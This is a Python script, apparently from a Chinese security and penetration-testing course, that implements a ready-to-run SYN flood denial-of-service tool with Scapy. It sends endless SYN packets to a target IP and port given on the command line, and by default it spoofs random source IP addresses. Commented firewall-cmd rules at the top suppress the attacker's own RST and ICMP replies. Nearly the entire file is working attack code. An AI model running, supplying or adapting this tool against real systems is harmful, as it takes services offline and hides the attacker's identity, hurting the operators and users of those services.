#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

#firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --tcp-flags RST RST -s 202.100.1.139 -j DROP
#firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p icmp -s 202.100.1.139 -j DROP

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *

def syn_dos(ip, port, random_enable=True):#定义方法，传入目标IP地址，目标端口号，是否激活随机伪装源IP地址
	if random_enable == True:#如果激活随机伪装源IP地址
		while True:#一直执行直到ctl+c停止程序
			source_port = random.randint(1024, 65535)#随机产生源端口
			init_sn = random.randint(1, 65535*63335)#随机产生初始化序列号
			yi_section = random.randint(1, 254)#随机产生，第一段IP地址
			er_section = random.randint(1, 254)#随机产生，第二段IP地址
			san_section = random.randint(1, 254)#随机产生，第三段IP地址
			si_section = random.randint(1, 254)#随机产生，第四段IP地址
			source_ip = str(yi_section)+'.'+str(er_section)+'.'+str(san_section)+'.'+str(si_section)#组合四段地址
			#发送SYN同步包（不必等待回应）#随机伪装源IP，随机产生源端口和初始化序列号
			send(IP(src=source_ip,dst=ip)/TCP(dport=port,sport=source_port,flags=2,seq=init_sn), verbose = False)
	else:#如果不激活随机伪装源IP地址
		while True:
			source_port = random.randint(1024, 65535)#随机产生源端口
			init_sn = random.randint(1, 65535*63335)#随机产生初始化序列号
			#发送SYN同步包（不必等待回应）#随机产生源端口和初始化序列号
			send(IP(dst=ip)/TCP(dport=port,sport=source_port,flags=2,seq=init_sn), verbose = False)

if __name__ == '__main__':
	import optparse#导入选项分析模块
	#配置帮助
	parser = optparse.OptionParser("程序使用方法介绍: -d <目标地址> -p <目标端口> -r <1:激活（默认） 2:不激活>")
	#选项‘-d’，指定目的IP地址
	parser.add_option('-d', dest = 'dst_ip', type = 'string', help = '指定目标地址')
	#选项‘-p’，指定目的端口号
	parser.add_option('-p', dest = 'dst_port', type = 'int', help = '指定目标端口')
	#选项‘-r’，是否激活随机伪装源IP地址
	parser.add_option('-r', dest = 'random', type = 'int', help = '是否激活随机IP')
	#分析参数，得到Options
	(options, args) = parser.parse_args()
	#如果没有指定目的IP，或者没有指定目的端口号，显示帮助信息给客户看！
	if (options.dst_ip == None) or (options.dst_port == None):
		print(parser.usage)
		exit(0)
	else:#如果客户指定了目的地址和目的端口号，为变量赋值！
		destination_ip = options.dst_ip
		destination_port = options.dst_port
	if options.random == 2:#如果客户不激活随机伪装源IP地址
		syn_dos(destination_ip, destination_port, random_enable = False)
	else:#客户激活随机伪装源IP地址
		syn_dos(destination_ip, destination_port, random_enable = True)


